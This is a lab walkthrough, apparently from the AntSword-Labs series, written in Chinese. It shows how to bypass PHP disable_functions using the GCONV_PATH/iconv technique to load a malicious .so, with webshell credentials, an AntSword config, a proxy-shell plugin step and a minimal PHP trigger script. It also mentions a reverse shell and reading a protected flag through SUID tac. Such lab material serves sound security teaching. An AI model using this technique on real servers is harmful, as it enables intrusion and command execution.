## 01 利用 LD_PRELOAD 环境变量

### php.ini 配置如下:

```ini
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,error_log
```

### 使用条件

* Linux 操作系统
* `putenv`
* `iconv`
* 存在可写的目录, 需要上传 `.so` 文件

> 相比 LD_PRELOAD 环境, 多禁用了 `error_log`

###  绕过实验

我们的最终目的是获取 `/flag` 的内容, 这个文件是 644 权限，`www-data` 用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 `tac` 命令(具体看 `/start.sh`)来获取 flag

1. 启动环境

```
$ docker-compose up -d
```

Shell | 密码
:-:|:-:
`http://127.0.0.1:18080/index.php` | `ant`
`http://127.0.0.1:18080/shell.php` | `ant`

2. 打开 AntSword 添加 Shell

![1.png](https://i.loli.net/2019/07/08/5d2224b0aa7ad32603.png)

也可直接使用配置导入插件导入下面的配置:

```
{"_id":"YoW1ftyOv7JjrLmN","addr":"IANA 保留地址用于本地回送","category":"default","ctime":1562515402313,"decoder":"default","encode":"UTF8","encoder":"base64","httpConf":{"body":{},"headers":{}},"ip":"127.0.0.1","note":"AntSword-Labs Bypass disable functions","otherConf":{"chunk-step-byte-max":"3","chunk-step-byte-min":"2","command-path":"","filemanager-cache":1,"ignore-https":1,"request-timeout":"30000","terminal-cache":0,"upload-fragment":"500","use-chunk":0,"use-multipart":0},"pwd":"ant","type":"php","url":"http://127.0.0.1:18080/index.php","utime":1562517866376}
```

3. 尝试使用虚拟终端执行命令, 无果

![2.png](https://i.loli.net/2019/07/08/5d2224b31884b21027.png)

4. 使用「绕过 disable_functions」插件, 选择 `iconv` 模式进行

![iconv_1.jpg](https://i.loli.net/2021/05/17/OSVoXiYB8jQudbE.jpg)

详细使用方法请点 [这里](https://mp.weixin.qq.com/s/GGnumPklkUNMLZKQL4NbKg)

成功后可以看到 `/var/www/html/` 目录下新建了一个 `.antproxy.php` 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 `.antproxy.php`, 就可以成功执行命令。

![iconv_2.jpg](https://i.loli.net/2021/05/17/4sQUc8GdqyambnM.jpg)

![iconv_3.jpg](https://i.loli.net/2021/05/17/HIaMVkrXo4vFxhR.jpg)

5. 尝试文件管理直接用 PHP 读 flag, 肯定是读不到的

6. 然后我们改用 tac 命令来获取 flag

![iconv_4.jpg](https://i.loli.net/2021/05/17/h5AtYrWKCqeNHuF.jpg)


#### 手动

原理脚本如下:

```
<?php
  putenv("GCONV_PATH=/tmp");
  iconv("payload", "UTF-8", "whatever");
?>
```

利用 GCONV_PATH 环境变量, 加载 hack.so, 在 hack.so 中执行命令.

我们可以直接利用 hack.so 反弹 shell, 或者将输出重定向到文件当中

### 参考链接

* https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80
* https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/
* https://xz.aliyun.com/t/8669
